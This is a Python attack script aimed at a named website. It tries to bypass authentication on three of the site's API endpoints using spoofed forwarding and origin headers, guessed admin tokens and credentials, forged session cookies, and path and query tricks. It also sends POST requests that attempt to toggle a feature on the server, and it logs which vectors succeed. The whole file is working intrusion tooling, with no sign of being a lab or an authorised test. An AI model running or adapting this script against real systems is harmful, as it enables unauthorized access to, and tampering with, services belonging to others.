import urllib.request
import urllib.error
import json
import ssl
import time

TARGET = "https://worldviewosint.com"
AUTH_ENDPOINTS = ["/api/telegram/report", "/api/ai/force", "/api/ai/toggle"]
ctx = ssl.create_default_context()

results = []

bypass_vectors = [
    ("Referer spoof", {"Referer": "https://worldviewosint.com/"}),
    ("Origin spoof", {"Origin": "https://worldviewosint.com"}),
    ("X-Forwarded-For localhost", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-For loopback", {"X-Forwarded-For": "::1"}),
    ("X-Real-IP localhost", {"X-Real-IP": "127.0.0.1"}),
    ("X-Originating-IP", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Custom-IP-Authorization", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("Auth Bearer null", {"Authorization": "Bearer null"}),
    ("Auth Bearer admin", {"Authorization": "Bearer admin"}),
    ("Auth Bearer test", {"Authorization": "Bearer test"}),
    ("Auth Basic admin:admin", {"Authorization": "Basic YWRtaW46YWRtaW4="}),
    ("Cookie session", {"Cookie": "session=admin; token=admin; auth=true"}),
    ("X-API-Key test", {"X-API-Key": "test"}),
    ("X-Auth-Token admin", {"X-Auth-Token": "admin"}),
    ("Content-Type trick", {"Content-Type": "application/json"}),
    ("All combined", {
        "Referer": "https://worldviewosint.com/",
        "Origin": "https://worldviewosint.com",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "Cookie": "session=admin",
        "Authorization": "Bearer admin"
    }),
]

path_bypass = [
    "",
    "?admin=1",
    "?auth=true",
    "?token=test",
    "?key=test",
    "?debug=true",
    "?bypass=true",
    "#",
    "/",
    "/../api/telegram/report",
]

for ep in AUTH_ENDPOINTS:
    print(f"\n{'='*60}")
    print(f"TARGET: {ep}")
    print(f"{'='*60}")

    # Header bypass vectors
    for name, headers in bypass_vectors:
        url = TARGET + ep
        method = "POST" if ep == "/api/ai/toggle" else "GET"
        all_headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        all_headers.update(headers)

        try:
            if method == "POST":
                data = json.dumps({"enabled": True}).encode("utf-8")
                all_headers["Content-Type"] = "application/json"
                req = urllib.request.Request(url, data=data, method=method, headers=all_headers)
            else:
                req = urllib.request.Request(url, method=method, headers=all_headers)
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read(500).decode("utf-8", errors="replace")
            status = resp.status
            if status == 200 and "Authentication required" not in body:
                print(f"  [!!!] BYPASS: {name} => {status} {body[:100]}")
            else:
                print(f"  [---] {name} => {status}")
            results.append({"endpoint": ep, "vector": name, "type": "header", "status": status, "body": body[:200], "bypassed": status == 200 and "error" not in body.lower()})
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read(200).decode("utf-8", errors="replace")
            except:
                pass
            print(f"  [---] {name} => {e.code} {body[:80]}")
            results.append({"endpoint": ep, "vector": name, "type": "header", "status": e.code, "body": body[:200], "bypassed": False})
        except Exception as e:
            print(f"  [ERR] {name} => {e}")
        time.sleep(0.3)

    # Path bypass vectors (only for telegram)
    if ep == "/api/telegram/report":
        print(f"\n  --- Path variations ---")
        for suffix in path_bypass:
            url = TARGET + ep + suffix
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body = resp.read(500).decode("utf-8", errors="replace")
                is_html = body.strip().startswith("<!DOCTYPE")
                if not is_html and "Authentication required" not in body:
                    print(f"  [!!!] PATH BYPASS: {ep}{suffix} => {resp.status} {body[:100]}")
                else:
                    tag = "HTML" if is_html else body[:50]
                    print(f"  [---] {ep}{suffix} => {resp.status} [{tag}]")
            except urllib.error.HTTPError as e:
                print(f"  [---] {ep}{suffix} => {e.code}")
            except Exception as e:
                print(f"  [ERR] {ep}{suffix} => {e}")
            time.sleep(0.3)

bypassed = [r for r in results if r.get("bypassed")]
print(f"\n\n{'='*60}")
print(f"BYPASS RESULTS: {len(bypassed)} successful out of {len(results)} attempts")
print(f"{'='*60}")

with open(r"C:\Users\mmrla\worldviewosnit\logs\auth_bypass.json", "w", encoding="utf-8") as f:
    json.dump(results, f, indent=2)
print("Saved to logs/auth_bypass.json")
